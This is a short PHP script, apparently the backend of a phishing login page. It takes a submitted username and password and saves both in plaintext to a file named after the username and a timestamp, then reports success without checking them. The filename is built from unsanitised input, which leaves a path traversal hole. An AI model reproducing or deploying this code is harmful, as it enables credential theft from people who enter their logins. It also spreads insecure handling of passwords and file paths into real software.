<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $usuario = isset($_POST['usuario']) ? $_POST['usuario'] : 'desconhecido';
    $senha = isset($_POST['senha']) ? $_POST['senha'] : 'vazia';
    
    date_default_timezone_set('America/Sao_Paulo');
    $horario = date('Y-m-d_H-i-s');
    
    $nomeArquivo = $usuario . "_" . $horario . ".txt";
    
    $conteudo = "Usuário: " . $usuario . "\n";
    $conteudo .= "Senha: " . $senha . "\n";
    $conteudo .= "Horário: " . date('d/m/Y H:i:s') . "\n";
    
    file_put_contents($nomeArquivo, $conteudo);
    
    echo json_encode(['status' => 'success']);
}
?>
